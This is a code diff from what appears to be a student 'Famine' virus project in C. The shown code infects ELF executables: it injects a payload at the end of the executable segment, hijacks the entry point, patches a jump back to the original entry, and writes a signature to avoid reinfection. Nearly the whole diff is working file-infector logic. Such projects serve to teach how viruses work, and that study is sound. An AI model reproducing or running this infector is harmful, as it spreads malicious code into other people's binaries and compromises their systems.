@@ -6,13 +6,13 @@
 /*   By: nguiard <marvin@42.fr>                     +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2024/10/31 10:47:01 by nguiard           #+#    #+#             */
-/*   Updated: 2024/11/05 11:39:40 by nguiard          ###   ########.fr       */
+/*   Updated: 2024/11/05 12:16:43 by nguiard          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
 #include "famine.h"
 
-static bool		parsing(byte *file, const struct stat file_stat, elf_data *data);
+static bool		parsing(byte *file, const struct stat file_stat, size_t size_sign_off, elf_data *data);
 static size_t	off_end_exec_segment(elf_data *data);
 
 #define	CODE_SIZE		0xa6b - 0x30 + 1
@@ -49,11 +49,14 @@ bool	infect(profiling *this, const str path) {
 	close(fd);
 	if (file_origin == MAP_FAILED) {
 		printf(FILE_LINE("fstat failed: %p\n"), file_origin);
+		return true;
 	}
 
 	// Logic starts
-	if (parsing(file_origin, file_stat, &data) == false)
+	if (parsing(file_origin, file_stat, this->size + SIGNATURE_OFFSET, &data) == false) {
+		printf("%s is already infected or not compatible\n", path);
 		goto infect_end;
+	}
 	
 	// ft_memcpy(data.file + data.signature_offset, (const byte *)SIGNATURE, SIGNATURE_LEN);
 
@@ -73,10 +76,11 @@ bool	infect(profiling *this, const str path) {
 
 	ft_memcpy(file_origin + data.infection_offset + 15, ((byte *)&entry_off), 4);
 
-	write(ret, 1, "abcdefgh", 8);
-	write(ret, 1, file_origin + data.infection_offset, 24);
-
 	data.elf->e_entry = data.infection_offset;
+
+	ft_memcpy(file_origin + data.infection_offset + this->size + SIGNATURE_OFFSET, (byte *)SIGNATURE, SIGNATURE_LEN);
+	printf("Written %s at 0x%lx\n", file_origin + data.infection_offset + this->size + SIGNATURE_OFFSET,
+		data.infection_offset + this->size + SIGNATURE_OFFSET);
 
 	// Logic ends
 	infect_end:
@@ -90,7 +94,7 @@ bool	infect(profiling *this, const str path) {
 //
 //	Returns true if it's compatible
 //	Returns false if it's not
-static bool	parsing(byte *file, const struct stat file_stat, elf_data *data) {
+static bool	parsing(byte *file, const struct stat file_stat, size_t size_sign_off, elf_data *data) {
 	(void)file_stat;
 
 	if (((uint32_t *)file)[0] != 0x464c457f)
@@ -106,12 +110,14 @@ static bool	parsing(byte *file, const struct stat file_stat, elf_data *data) {
 	data->elf = (Elf64_Ehdr *)file;
 	data->sections = (Elf64_Shdr *)(file + data->elf->e_shoff);
 	data->segments = (Elf64_Phdr *)(file + data->elf->e_phoff);
-	data->signature_offset = off_end_exec_segment(data);
-	data->infection_offset = data->signature_offset + SIGNATURE_LEN;
+	data->infection_offset = off_end_exec_segment(data);
+	data->signature_offset = data->infection_offset + size_sign_off;
 	data->original_entry_point = data->elf->e_entry;
 
-	if (ft_memcmp((const byte *)SIGNATURE, file + data->signature_offset, SIGNATURE_LEN) == true)
+	if (ft_memcmp((const byte *)SIGNATURE, file + data->signature_offset, SIGNATURE_LEN) == true) {
+		printf("INFECTED !\n");
 		return false;
+	}
 
 	return true;
 }
@@ -140,12 +146,6 @@ static size_t	off_end_exec_segment(elf_data *data) {
 				if (segment_end % segment->p_align != 0)
 					segment_end += segment->p_align - (segment_end % segment->p_align);
 
-
-				//	printf("Range: %lx - %lx <=> %lx - %lx | type: %d | flags: %d == %d ?\n",
-				//		segment->p_offset, segment_end,
-				//		section->sh_offset, section->sh_offset + section->sh_size,
-				//		segment->p_type, segment->p_flags, (PF_X | PF_R));
-
 				if (segment->p_type == PT_LOAD &&
 					(segment->p_flags == (PF_X | PF_R)) &&
 					segment->p_offset <= section->sh_offset &&
@@ -163,7 +163,6 @@ static size_t	off_end_exec_segment(elf_data *data) {
 	for (size_t i = 0; i < data->elf->e_shnum; i++) {
 		section = &data->sections[i];
 
-		//	printf("Range: %lx - %lx\n", section->sh_offset, section->sh_offset + section->sh_size);
 		if (section->sh_offset >= exec_begin &&
 			section->sh_offset + section->sh_size < exec_end &&
 			section->sh_offset + section->sh_size > offset)
